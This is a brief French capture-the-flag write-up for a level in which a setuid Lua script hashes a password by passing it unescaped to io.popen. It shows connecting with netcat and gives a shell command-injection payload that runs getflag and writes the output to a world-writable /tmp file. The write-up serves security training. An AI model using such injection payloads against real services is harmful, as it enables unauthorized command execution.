Qui suis-je? Ou suis-je?
$ ls -la
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
(un script lua)

Un programme qui ouvre une connexion et attends un password pour le comparer avec celui hashé
Il utilise la fonction "io.popen" qui execute des programmes

io.popen("echo "..pass.." | sha1sum", "r")
Il execute un echo + le mdp pipe dans sha1sum pour le hash

On test la connexion avec netcat
$ nc localhost 5151
Password:
(Il attend le mot de passe)

On peut injecter des commandes a executer pour completer le echo

$(getflag) > /tmp/coucou; chmod 777 /tmp/coucou; echo coucou
